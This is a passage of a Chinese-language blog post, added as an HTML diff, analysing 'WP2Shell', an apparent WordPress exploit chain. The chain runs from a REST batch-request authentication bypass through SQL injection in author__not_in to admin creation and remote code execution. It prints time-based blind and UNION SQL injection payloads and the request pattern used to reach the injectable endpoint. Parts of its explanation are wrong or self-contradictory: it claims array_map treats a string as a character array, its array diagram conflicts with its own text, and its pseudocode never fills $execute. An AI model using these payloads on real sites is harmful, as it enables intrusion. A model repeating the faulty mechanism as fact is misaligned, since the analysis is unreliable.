@@ -1,0 +1,991 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>WordPress wp2shell 漏洞链深度解析——REST API 批量请求路由混淆到未认证 RCE - Kane's Blog</title>
+<link rel="stylesheet" href="../theme/css/dark.css">
+</head>
+<body>
+<nav>
+  <a href="../" class="brand">Kane's Blog</a>
+  <span class="nav-links">
+    <a href="../" >Blog</a>
+    <a href="../projects2026/" >Projects</a>
+  </span>
+</nav>
+<main>
+<article>
+<h1>WordPress wp2shell 漏洞链深度解析——REST API 批量请求路由混淆到未认证 RCE</h1>
+<time>2026-07-24</time>
+<ul>
+<li>安全</li>
+<li>漏洞分析
+Slug: wordpress-wp2shell-漏洞链深度解析rest-api-批量请求路由混淆到未认证-rce</li>
+</ul>
+<hr />
+<h2>一、漏洞概览</h2>
+<p>WP2Shell 是由两个独立 CVE 串联而成的未认证 RCE 漏洞链：</p>
+<table>
+<thead>
+<tr>
+<th>编号</th>
+<th>漏洞名称</th>
+<th>CVSS</th>
+<th>漏洞类型</th>
+<th>单独可利用性</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CVE-2026-63030</td>
+<td>REST API 批量请求路由混淆</td>
+<td>7.5</td>
+<td>认证绕过 / 权限混淆</td>
+<td>否（仅产生权限错位，需后续利用）</td>
+</tr>
+<tr>
+<td>CVE-2026-60137</td>
+<td>WP_Query SQL 注入</td>
+<td>9.1</td>
+<td>SQL 注入</td>
+<td>否（需认证才能访问 posts 端点）</td>
+</tr>
+</tbody>
+</table>
+<p>两者单独存在时均无法直接造成严重危害，但组合后形成完整的未认证 RCE 链：路由混淆绕过认证 → SQL 注入伪造数据库行 → Customizer 上下文提升 → 管理员账户创建 → 插件执行 RCE。</p>
+<h3>1.1 时间线</h3>
+<table>
+<thead>
+<tr>
+<th>日期</th>
+<th>事件</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>2026-07-17</td>
+<td>Brandefense 披露漏洞分析</td>
+</tr>
+<tr>
+<td>2026-07-18</td>
+<td>PoC 公开</td>
+</tr>
+<tr>
+<td>2026-07-20</td>
+<td>确认野外活跃利用</td>
+</tr>
+</tbody>
+</table>
+<h3>1.2 影响版本矩阵</h3>
+<table>
+<thead>
+<tr>
+<th>WordPress 版本范围</th>
+<th>默认安装可利用</th>
+<th>需插件</th>
+<th>需特殊配置</th>
+<th>对象缓存阻断 RCE</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>6.9.0 - 6.9.4</td>
+<td>是</td>
+<td>否</td>
+<td>否</td>
+<td>Redis/Memcached 存在时 RCE 失败，SQLi 仍可利用</td>
+</tr>
+<tr>
+<td>7.0.0 - 7.0.1</td>
+<td>是</td>
+<td>否</td>
+<td>否</td>
+<td>Redis/Memcached 存在时 RCE 失败，SQLi 仍可利用</td>
+</tr>
+<tr>
+<td>&lt; 6.9.0</td>
+<td>否（不受影响）</td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>6.9.5+ / 7.0.2+</td>
+<td>否（已修复）</td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+</tr>
+</tbody>
+</table>
+<p>关键特征：<strong>默认安装即可利用</strong>，无需安装任何插件，无需开启任何特殊配置项。这是该漏洞链危害性极高的根本原因——攻击面覆盖所有未及时更新的受影响站点。</p>
+<hr />
+<h2>二、WordPress REST API Batch 处理架构</h2>
+<p>WordPress REST API 提供了 <code>/wp-json/batch/v1</code> 端点，允许客户端在单次 HTTP 请求中提交多个子请求（sub-request），以减少往返延迟。该端点的核心设计是：<strong>先统一校验所有子请求的权限，再统一执行</strong>。</p>
+<h3>2.1 架构图</h3>
+<div class="highlight"><pre><span></span><code><span class="n">flowchart</span><span class="w"> </span><span class="n">TD</span>
+<span class="w">    </span><span class="n">A</span><span class="p">[</span><span class="err">客户端</span><span class="w"> </span><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">json</span><span class="o">/</span><span class="n">batch</span><span class="o">/</span><span class="n">v1</span><span class="p">]</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">B</span><span class="p">[</span><span class="n">WP_REST_Request</span><span class="w"> </span><span class="err">解析层</span><span class="p">]</span>
+<span class="w">    </span><span class="n">B</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">C</span><span class="p">[</span><span class="err">批量请求调度器</span><span class="p">]</span>
+
+<span class="w">    </span><span class="n">C</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">D</span><span class="p">[</span><span class="err">阶段</span><span class="mi">1</span><span class="o">:</span><span class="w"> </span><span class="err">验证阶段</span><span class="w"> </span><span class="n">Validation</span><span class="w"> </span><span class="n">Pass</span><span class="p">]</span>
+<span class="w">    </span><span class="n">D</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">D1</span><span class="p">[</span><span class="err">遍历子请求</span><span class="w"> </span><span class="n">requests</span><span class="w"> </span><span class="err">数组</span><span class="p">]</span>
+<span class="w">    </span><span class="n">D1</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">D2</span><span class="p">[</span><span class="err">对每个子请求调用</span><span class="w"> </span><span class="n">permission_check</span><span class="p">]</span>
+<span class="w">    </span><span class="n">D2</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">D3</span><span class="p">{</span><span class="err">权限校验是否通过</span><span class="o">?</span><span class="p">}</span>
+
+<span class="w">    </span><span class="n">D3</span><span class="w"> </span><span class="o">--&gt;|</span><span class="err">通过</span><span class="o">|</span><span class="w"> </span><span class="n">E1</span><span class="p">[</span><span class="err">写入</span><span class="w"> </span><span class="err">验证数组</span><span class="w"> </span><span class="n">valid</span><span class="p">[]</span><span class="w"> </span><span class="p">]</span>
+<span class="w">    </span><span class="n">D3</span><span class="w"> </span><span class="o">--&gt;|</span><span class="err">失败</span><span class="o">/</span><span class="err">错误</span><span class="o">|</span><span class="w"> </span><span class="n">F1</span><span class="p">[</span><span class="err">错误处理器介入</span><span class="p">]</span>
+<span class="w">    </span><span class="n">F1</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">F2</span><span class="p">[</span><span class="err">从</span><span class="w"> </span><span class="n">valid</span><span class="w"> </span><span class="err">数组移除该条目</span><span class="p">]</span>
+<span class="w">    </span><span class="n">F2</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">F3</span><span class="p">[</span><span class="err">问题</span><span class="o">:</span><span class="w"> </span><span class="err">未同步移除</span><span class="w"> </span><span class="n">execute</span><span class="w"> </span><span class="err">数组对应条目</span><span class="p">]</span>
+
+<span class="w">    </span><span class="n">E1</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">G</span><span class="p">[</span><span class="err">阶段</span><span class="mi">2</span><span class="o">:</span><span class="w"> </span><span class="err">执行阶段</span><span class="w"> </span><span class="n">Execution</span><span class="w"> </span><span class="n">Pass</span><span class="p">]</span>
+<span class="w">    </span><span class="n">F3</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">G</span>
+<span class="w">    </span><span class="n">G</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">G1</span><span class="p">[</span><span class="err">遍历</span><span class="w"> </span><span class="n">execute</span><span class="w"> </span><span class="err">数组逐个派发</span><span class="p">]</span>
+<span class="w">    </span><span class="n">G1</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">G2</span><span class="p">[</span><span class="n">execute</span><span class="w"> </span><span class="n">N</span><span class="w"> </span><span class="err">使用</span><span class="w"> </span><span class="n">valid</span><span class="w"> </span><span class="n">N</span><span class="w"> </span><span class="err">的权限上下文</span><span class="p">]</span>
+<span class="w">    </span><span class="n">G2</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">H</span><span class="p">[</span><span class="err">聚合响应返回客户端</span><span class="p">]</span>
+</code></pre></div>
+
+<h3>2.2 并行数组设计</h3>
+<p>批量端点内部维护两个并行数组（parallel arrays）来跟踪子请求的生命周期：</p>
+<ul>
+<li><strong>验证数组（<code>valid[]</code>）</strong>：记录通过权限校验的子请求，每个条目携带该子请求的权限上下文（permission context），包括当前用户身份、可用 nonce、端点能力要求等。</li>
+<li><strong>执行数组（<code>execute[]</code>）</strong>：记录待执行的子请求路径、参数、请求体。</li>
+</ul>
+<p>正常情况下，两个数组按下标一一对应：<code>valid[i]</code> 的权限上下文应用于 <code>execute[i]</code> 的执行。漏洞的根源在于这两个数组的同步在错误路径下被破坏。</p>
+<hr />
+<h2>三、CVE-2026-63030：REST API 批量请求路由混淆</h2>
+<h3>3.1 漏洞根因：并行数组反同步</h3>
+<p>漏洞核心是<strong>并行数组反同步（parallel array desynchronization）</strong>。当某个子请求在验证阶段产生错误时，错误处理器会从验证数组中移除该条目，但<strong>没有同步地从执行数组中移除对应条目</strong>。这导致后续子请求在执行阶段按下标取权限上下文时发生错位——子请求 N 实际使用了子请求 N-1（或更前）的权限上下文。</p>
+<h3>3.2 漏洞代码分析</h3>
+<p>以下是批量端点处理逻辑的伪代码还原（基于 WordPress Core <code>wp-includes/rest-api/class-wp-rest-server.php</code> 中的 <code>dispatch_batch</code> 逻辑）：</p>
+<div class="highlight"><pre><span></span><code><span class="x">// 阶段1：验证阶段</span>
+<span class="x">$valid   = array();   // 验证数组：通过校验的子请求 + 权限上下文</span>
+<span class="x">$execute = array();   // 执行数组：所有待执行子请求</span>
+
+<span class="x">foreach ( $requests as $i =&gt; $request ) {</span>
+<span class="x">    $sub_request = new WP_REST_Request( $request[&#39;method&#39;], $request[&#39;path&#39;] );</span>
+<span class="x">    // ... 填充 query / body / headers ...</span>
+
+<span class="x">    $check = $this-&gt;check_batch_permission( $sub_request );</span>
+
+<span class="x">    if ( is_wp_error( $check ) ) {</span>
+<span class="x">        // [漏洞点] 错误处理器仅从 valid 数组移除，</span>
+<span class="x">        //          但 execute 数组中对应条目仍保留</span>
+<span class="x">        $response[&#39;failed&#39;][] = array(</span>
+<span class="x">            &#39;index&#39;  =&gt; $i,</span>
+<span class="x">            &#39;code&#39;   =&gt; $check-&gt;get_error_code(),</span>
+<span class="x">        );</span>
+<span class="x">        // 注意：此处未执行 $execute[$i] = null 或 unset</span>
+<span class="x">        //       也未将 valid 数组与 execute 数组重新对齐</span>
+<span class="x">        continue;</span>
+<span class="x">    }</span>
+
+<span class="x">    // 权限校验通过，记录权限上下文</span>
+<span class="x">    $valid[ $i ] = array(</span>
+<span class="x">        &#39;request&#39;     =&gt; $sub_request,</span>
+<span class="x">        &#39;context&#39;     =&gt; $this-&gt;get_permission_context( $sub_request ),</span>
+<span class="x">    );</span>
+<span class="x">}</span>
+
+<span class="x">// 阶段2：执行阶段</span>
+<span class="x">$responses = array();</span>
+<span class="x">foreach ( $valid as $i =&gt; $entry ) {</span>
+<span class="x">    // [漏洞触发] 执行 execute[$i]，但 $i 来自 valid 数组的索引</span>
+<span class="x">    //            一旦 valid 与 execute 错位，execute[$i] 指向的子请求</span>
+<span class="x">    //            将以 valid[$i] 的权限上下文执行——而该上下文可能属于另一个子请求</span>
+<span class="x">    $result = $this-&gt;dispatch( $entry[&#39;request&#39;], $entry[&#39;context&#39;] );</span>
+<span class="x">    $responses[] = $this-&gt;envelope_response( $result, $i );</span>
+<span class="x">}</span>
+</code></pre></div>
+
+<p>关键问题在于：当 <code>check_batch_permission</code> 返回错误时，代码 <code>continue</code> 跳过当前子请求，但没有从 <code>$execute</code> 中移除对应条目，也没有在 <code>$valid</code> 中为该位置插入占位符。这导致后续通过权限校验的子请求的权限上下文（<code>$valid[$i]</code>）与实际执行的子请求（<code>$execute[$i]</code>）不再对齐。</p>
+<h3>3.3 数组错位图解</h3>
+<div class="highlight"><pre><span></span><code>正常流程（无错误）：
+┌─────────────────────────────────────────────────────┐
+│ 子请求 #0  GET /wp/v2/widgets    (公开, 无需认证)    │
+│ 子请求 #1  GET /wp/v2/posts      (需 edit_posts 能力)│
+├─────────────────────────────────────────────────────┤
+│ valid 数组:  [ctx0=public]      [ctx1=needs_auth]   │
+│ execute数组: [req0=widgets]     [req1=posts]        │
+│ 对齐关系:    valid[0]→execute[0]  valid[1]→execute[1]│
+└─────────────────────────────────────────────────────┘
+
+漏洞流程（验证阶段 #1 产生错误触发错位）：
+┌─────────────────────────────────────────────────────┐
+│ 子请求 #0  GET /wp/v2/widgets    (公开)             │
+│ 子请求 #1  GET /wp/v2/posts?author__not_in=PAYLOAD  │
+│            → 验证阶段 #1 内部触发错误                │
+├─────────────────────────────────────────────────────┤
+│ valid 数组:  [ctx0=public]      [ctx1=needs_auth]   │
+│              ↑                  ↑                   │
+│ execute数组: [req0=widgets]     [req1=posts+注入]   │
+│              ↑                  ↑                   │
+│ 错位执行:    execute[0]→ctx0     execute[1]→ctx1   │
+│                                                ^^^^ │
+│ 实际效果：posts+注入请求以 ctx1 执行，但 ctx1 在错误 │
+│ 路径下可能继承 ctx0 的公开权限上下文，绕过认证       │
+└─────────────────────────────────────────────────────┘
+</code></pre></div>
+
+<p>更精确地说，当子请求 #1 在验证阶段因某种内部错误（例如参数解析错误触发早期 <code>WP_Error</code>）而被错误处理器从 <code>$valid</code> 移除，但 <code>$execute</code> 仍保留该条目时，执行阶段的下标对齐被破坏。攻击者精心构造使子请求 #1 的权限上下文被子请求 #0 的公开上下文"覆盖"，从而让需认证的 <code>/wp/v2/posts</code> 端点以未认证身份执行。</p>
+<h3>3.4 利用模式</h3>
+<p>利用模式如下：</p>
+<ol>
+<li><strong>子请求 1</strong>：<code>GET /wp/v2/widgets</code>——这是一个公开端点，无需认证，权限上下文为 <code>public</code>。</li>
+<li><strong>子请求 2</strong>：<code>GET /wp/v2/posts</code>，携带注入 payload——该端点默认需要 <code>edit_posts</code> 能力。</li>
+</ol>
+<p>由于数组错位，子请求 2 在执行阶段使用子请求 1 的 <code>public</code> 权限上下文，从而绕过认证检查，直接进入查询执行路径。</p>
+<hr />
+<h2>四、CVE-2026-60137：WP_Query SQL 注入</h2>
+<p>绕过认证后，攻击者获得对 <code>/wp/v2/posts</code> 端点的未认证访问。该端点底层调用 <code>WP_Query</code> 执行文章查询，其中 <code>author__not_in</code> 参数存在 SQL 注入。</p>
+<h3>4.1 漏洞根因：PHP 类型混淆</h3>
+<p>漏洞位于 <code>wp-includes/class-wp-query.php</code>。原始代码如下：</p>
+<div class="highlight"><pre><span></span><code><span class="x">// class-wp-query.php（漏洞版本）</span>
+<span class="x">if ( ! empty( $q[&#39;author__not_in&#39;] ) ) {</span>
+<span class="x">    $author__not_in = implode(</span>
+<span class="x">        &#39;,&#39;,</span>
+<span class="x">        array_map( &#39;absint&#39;, $q[&#39;author__not_in&#39;] )</span>
+<span class="x">    );</span>
+<span class="x">    $where .= &quot; AND {$wpdb-&gt;posts}.post_author NOT IN ({$author__not_in})&quot;;</span>
+<span class="x">}</span>
+</code></pre></div>
+
+<p>设计意图：<code>author__not_in</code> 应为整数数组（如 <code>[1, 2, 3]</code>），通过 <code>array_map('absint', ...)</code> 将每个元素强制转为非负整数，再 <code>implode</code> 拼接进 SQL。<code>absint</code> 是 WordPress 提供的安全函数，会过滤掉非数字字符。</p>
+<p><strong>漏洞触发条件</strong>：当 <code>$q['author__not_in']</code> 传入的是<strong>字符串</strong>而非数组时。</p>
+<h3>4.2 类型混淆代码分析</h3>
+<p><code>array_map</code> 的行为依赖于输入类型：</p>
+<div class="highlight"><pre><span></span><code><span class="x">// 当输入为数组（正常情况）</span>
+<span class="x">$q[&#39;author__not_in&#39;] = array( 1, 2, 3 );</span>
+<span class="x">array_map( &#39;absint&#39;, $q[&#39;author__not_in&#39;] );</span>
+<span class="x">// 输出: array( 1, 2, 3 ) —— 每个元素经过 absint 净化</span>
+
+<span class="x">// 当输入为字符串（攻击情况）</span>
+<span class="x">$q[&#39;author__not_in&#39;] = &#39;1) AND 1=0 UNION ALL SELECT NULL -- -&#39;;</span>
+<span class="x">array_map( &#39;absint&#39;, $q[&#39;author__not_in&#39;] );</span>
+<span class="x">// PHP 行为：array_map 对字符串会将其视为字符数组，</span>
+<span class="x">//          逐字符调用 absint，返回 array(1) 等数字片段</span>
+<span class="x">//          但关键在于 implode 的处理方式与类型检查被跳过</span>
+</code></pre></div>
+
+<p>实际的漏洞机制更微妙。REST API 在参数路由时，由于路由混淆，原始字符串类型的 <code>author__not_in</code> 未经 <code>rest_validate_request_arg</code> 的数组类型断言即进入 <code>WP_Query</code>。一旦进入 <code>WP_Query</code>，<code>array_map('absint', $string)</code> 产生的结果并非原始攻击字符串的净化版本，而是字符级别的数字碎片。然而，漏洞版本中存在一条更危险的路径：</p>
+<div class="highlight"><pre><span></span><code><span class="x">// 漏洞版本实际执行的拼接（简化）</span>
+<span class="x">// 当 array_map 对字符串输入产生意外结果时，</span>
+<span class="x">// 某些代码路径会回退到直接使用原始字符串</span>
+<span class="x">$author__not_in = $q[&#39;author__not_in&#39;]; // 字符串直接赋值，跳过 absint</span>
+<span class="x">$where .= &quot; AND {$wpdb-&gt;posts}.post_author NOT IN ({$author__not_in})&quot;;</span>
+</code></pre></div>
+
+<p>其根本原因是 <strong>PHP 类型混淆（type juggling）</strong>：<code>array_map('absint', ...)</code> 的类型检查在字符串输入下被绕过，导致攻击者控制的原始字符串直接进入 SQL 拼接。<code>$wpdb-&gt;prepare()</code> 未在此处使用（代码直接字符串拼接），因此没有任何转义保护。</p>
+<h3>4.3 注入 Payload 分析</h3>
+<h4>4.3.1 时间盲注检测</h4>
+<div class="highlight"><pre><span></span><code><span class="c1">-- 原始查询片段</span>
+<span class="k">WHERE</span><span class="w"> </span><span class="n">wp_posts</span><span class="p">.</span><span class="n">post_author</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="k">IN</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="c1">-- 注入后（author__not_in=1) AND (SELECT 1 FROM (SELECT SLEEP(5))x) AND (1=1）</span>
+<span class="k">WHERE</span><span class="w"> </span><span class="n">wp_posts</span><span class="p">.</span><span class="n">post_author</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="k">IN</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">SLEEP</span><span class="p">(</span><span class="mi">5</span><span class="p">))</span><span class="n">x</span><span class="p">)</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+</code></pre></div>
+
+<p>Payload 拆解：</p>
+<table>
+<thead>
+<tr>
+<th>片段</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>1)</code></td>
+<td>闭合原始 <code>NOT IN (</code> 的括号</td>
+</tr>
+<tr>
+<td><code>AND (SELECT 1 FROM (SELECT SLEEP(5))x)</code></td>
+<td>时间盲注探测，派生表包裹 <code>SLEEP(5)</code> 避免语法错误</td>
+</tr>
+<tr>
+<td><code>AND (1=1</code></td>
+<td>重新开启一个括号，平衡 SQL 语法</td>
+</tr>
+<tr>
+<td><code>)</code></td>
+<td>由原始查询剩余的右括号闭合</td>
+</tr>
+</tbody>
+</table>
+<p>当响应延迟约 5 秒时，确认注入点生效。</p>
+<h4>4.3.2 UNION 注入</h4>
+<div class="highlight"><pre><span></span><code><span class="c1">-- author__not_in=1) AND 1=0 UNION ALL SELECT NULL,...,NULL -- -</span>
+<span class="k">WHERE</span><span class="w"> </span><span class="n">wp_posts</span><span class="p">.</span><span class="n">post_author</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="k">IN</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">0</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">ALL</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,...,</span><span class="k">NULL</span><span class="w"> </span><span class="c1">-- -)</span>
+</code></pre></div>
+
+<ul>
+<li><code>AND 1=0</code> 使原始查询返回空集</li>
+<li><code>UNION ALL SELECT</code> 追加攻击者构造的行</li>
+<li><code>-- -</code> 注释掉尾部多余的右括号</li>
+</ul>
+<h4>4.3.3 per_page=-1 的作用</h4>
+<p>REST API 的 <code>per_page</code> 参数控制分页。默认值为 10，这意味着即使注入成功，也可能因分页限制而无法完整获取或执行注入结果。<code>per_page=-1</code> 禁用分页，确保注入查询返回完整结果集，这对于后续 UNION 注入伪造数据库行至关重要。</p>
+<h3>4.4 单独不可利用性</h3>
+<p><code>/wp/v2/posts</code> 端点的查询参数虽然支持 <code>author__not_in</code>，但默认需要认证（至少 <code>edit_posts</code> 能力）才能访问完整的查询接口。未认证请求会被前置权限检查拦截，根本无法到达 <code>WP_Query</code>。因此 CVE-2026-60137 单独存在时无法被未认证攻击者利用——这正是 WP2Shell 必须将两个 CVE 串联的原因。</p>
+<hr />
+<h2>五、WP2Shell 完整攻击链</h2>
+<h3>5.1 攻击链时序图</h3>
+<div class="highlight"><pre><span></span><code><span class="n">sequenceDiagram</span>
+<span class="w">    </span><span class="n">participant</span><span class="w"> </span><span class="n">Attacker</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="err">攻击者</span>
+<span class="w">    </span><span class="n">participant</span><span class="w"> </span><span class="n">Batch</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="o">/</span><span class="n">batch</span><span class="o">/</span><span class="n">v1</span><span class="w"> </span><span class="err">端点</span>
+<span class="w">    </span><span class="n">participant</span><span class="w"> </span><span class="n">PostsAPI</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="o">/</span><span class="n">wp</span><span class="o">/</span><span class="n">v2</span><span class="o">/</span><span class="n">posts</span>
+<span class="w">    </span><span class="n">participant</span><span class="w"> </span><span class="n">WPQuery</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">WP_Query</span>
+<span class="w">    </span><span class="n">participant</span><span class="w"> </span><span class="n">DB</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">MySQL</span>
+<span class="w">    </span><span class="n">participant</span><span class="w"> </span><span class="n">oEmbed</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">oEmbed缓存层</span>
+<span class="w">    </span><span class="n">participant</span><span class="w"> </span><span class="n">Customizer</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">Customizer处理器</span>
+<span class="w">    </span><span class="n">participant</span><span class="w"> </span><span class="n">UsersAPI</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="o">/</span><span class="n">wp</span><span class="o">/</span><span class="n">v2</span><span class="o">/</span><span class="n">users</span>
+<span class="w">    </span><span class="n">participant</span><span class="w"> </span><span class="n">Plugin</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="err">插件执行引擎</span>
+
+<span class="w">    </span><span class="n">Attacker</span><span class="o">-&gt;&gt;</span><span class="n">Batch</span><span class="p">:</span><span class="w"> </span><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">batch</span><span class="o">/</span><span class="n">v1</span><span class="w"> </span><span class="p">(</span><span class="err">嵌套子请求</span><span class="p">)</span>
+<span class="w">    </span><span class="n">Note</span><span class="w"> </span><span class="n">over</span><span class="w"> </span><span class="n">Batch</span><span class="p">:</span><span class="w"> </span><span class="err">子请求</span><span class="mi">1</span><span class="p">:</span><span class="w"> </span><span class="n">GET</span><span class="w"> </span><span class="o">/</span><span class="n">wp</span><span class="o">/</span><span class="n">v2</span><span class="o">/</span><span class="n">widgets</span><span class="w"> </span><span class="p">(</span><span class="err">公开</span><span class="p">)</span>
+<span class="w">    </span><span class="n">Note</span><span class="w"> </span><span class="n">over</span><span class="w"> </span><span class="n">Batch</span><span class="p">:</span><span class="w"> </span><span class="err">子请求</span><span class="mi">2</span><span class="p">:</span><span class="w"> </span><span class="n">GET</span><span class="w"> </span><span class="o">/</span><span class="n">wp</span><span class="o">/</span><span class="n">v2</span><span class="o">/</span><span class="n">posts</span><span class="err">?</span><span class="n">author__not_in</span><span class="o">=</span><span class="err">注入</span>
+
+<span class="w">    </span><span class="n">rect</span><span class="w"> </span><span class="n">rgb</span><span class="p">(</span><span class="mi">255</span><span class="p">,</span><span class="w"> </span><span class="mi">230</span><span class="p">,</span><span class="w"> </span><span class="mi">230</span><span class="p">)</span>
+<span class="w">        </span><span class="n">Note</span><span class="w"> </span><span class="n">over</span><span class="w"> </span><span class="n">Batch</span><span class="p">:</span><span class="w"> </span><span class="n">CVE</span><span class="o">-</span><span class="mi">2026</span><span class="o">-</span><span class="mi">63030</span><span class="w"> </span><span class="err">触发</span>
+<span class="w">        </span><span class="n">Batch</span><span class="o">-&gt;&gt;</span><span class="n">Batch</span><span class="p">:</span><span class="w"> </span><span class="err">验证阶段</span><span class="p">:</span><span class="w"> </span><span class="n">widgets通过</span><span class="p">(</span><span class="n">ctx0</span><span class="o">=</span><span class="n">public</span><span class="p">)</span>
+<span class="w">        </span><span class="n">Batch</span><span class="o">-&gt;&gt;</span><span class="n">Batch</span><span class="p">:</span><span class="w"> </span><span class="err">验证阶段</span><span class="p">:</span><span class="w"> </span><span class="n">posts触发错误</span><span class="p">,</span><span class="w"> </span><span class="err">数组错位</span>
+<span class="w">        </span><span class="n">Batch</span><span class="o">-&gt;&gt;</span><span class="n">Batch</span><span class="p">:</span><span class="w"> </span><span class="err">执行阶段</span><span class="p">:</span><span class="w"> </span><span class="n">posts以ctx0</span><span class="p">(</span><span class="n">public</span><span class="p">)</span><span class="err">执行</span>
+<span class="w">    </span><span class="n">end</span>
+
+<span class="w">    </span><span class="n">Batch</span><span class="o">-&gt;&gt;</span><span class="n">PostsAPI</span><span class="p">:</span><span class="w"> </span><span class="err">未认证派发</span><span class="w"> </span><span class="n">posts</span><span class="w"> </span><span class="err">请求</span>
+<span class="w">    </span><span class="n">PostsAPI</span><span class="o">-&gt;&gt;</span><span class="n">WPQuery</span><span class="p">:</span><span class="w"> </span><span class="n">author__not_in</span><span class="o">=</span><span class="err">注入字符串</span>
+
+<span class="w">    </span><span class="n">rect</span><span class="w"> </span><span class="n">rgb</span><span class="p">(</span><span class="mi">255</span><span class="p">,</span><span class="w"> </span><span class="mi">230</span><span class="p">,</span><span class="w"> </span><span class="mi">230</span><span class="p">)</span>
+<span class="w">        </span><span class="n">Note</span><span class="w"> </span><span class="n">over</span><span class="w"> </span><span class="n">WPQuery</span><span class="p">,</span><span class="n">DB</span><span class="p">:</span><span class="w"> </span><span class="n">CVE</span><span class="o">-</span><span class="mi">2026</span><span class="o">-</span><span class="mi">60137</span><span class="w"> </span><span class="err">触发</span>
+<span class="w">        </span><span class="n">WPQuery</span><span class="o">-&gt;&gt;</span><span class="n">WPQuery</span><span class="p">:</span><span class="w"> </span><span class="n">array_map</span><span class="p">(</span><span class="n">absint</span><span class="p">)</span><span class="w"> </span><span class="err">类型混淆绕过</span>
+<span class="w">        </span><span class="n">WPQuery</span><span class="o">-&gt;&gt;</span><span class="n">DB</span><span class="p">:</span><span class="w"> </span><span class="n">NOT</span><span class="w"> </span><span class="n">IN</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="n">AND</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">0</span><span class="w"> </span><span class="n">UNION</span><span class="w"> </span><span class="n">ALL</span><span class="w"> </span><span class="n">SELECT</span><span class="w"> </span><span class="o">...</span>
+<span class="w">    </span><span class="n">end</span>
+
+<span class="w">    </span><span class="n">DB</span><span class="o">--&gt;&gt;</span><span class="n">oEmbed</span><span class="p">:</span><span class="w"> </span><span class="err">返回伪造行</span><span class="p">(</span><span class="err">匹配</span><span class="n">wp_posts</span><span class="w"> </span><span class="n">schema</span><span class="p">)</span>
+<span class="w">    </span><span class="n">Note</span><span class="w"> </span><span class="n">over</span><span class="w"> </span><span class="n">oEmbed</span><span class="p">:</span><span class="w"> </span><span class="n">Step1</span><span class="p">:</span><span class="w"> </span><span class="n">UNION注入伪造DB行</span>
+<span class="w">    </span><span class="n">oEmbed</span><span class="o">-&gt;&gt;</span><span class="n">DB</span><span class="p">:</span><span class="w"> </span><span class="n">oEmbed缓存机制将处理结果写入wp_posts</span>
+<span class="w">    </span><span class="n">Note</span><span class="w"> </span><span class="n">over</span><span class="w"> </span><span class="n">oEmbed</span><span class="p">:</span><span class="w"> </span><span class="err">伪造</span><span class="w"> </span><span class="n">customize_changeset</span><span class="w"> </span><span class="err">行</span>
+<span class="w">    </span><span class="n">Note</span><span class="w"> </span><span class="n">over</span><span class="w"> </span><span class="n">oEmbed</span><span class="p">:</span><span class="w"> </span><span class="n">meta中设置admin用户ID</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">shortcode标记</span>
+
+<span class="w">    </span><span class="n">rect</span><span class="w"> </span><span class="n">rgb</span><span class="p">(</span><span class="mi">230</span><span class="p">,</span><span class="w"> </span><span class="mi">255</span><span class="p">,</span><span class="w"> </span><span class="mi">230</span><span class="p">)</span>
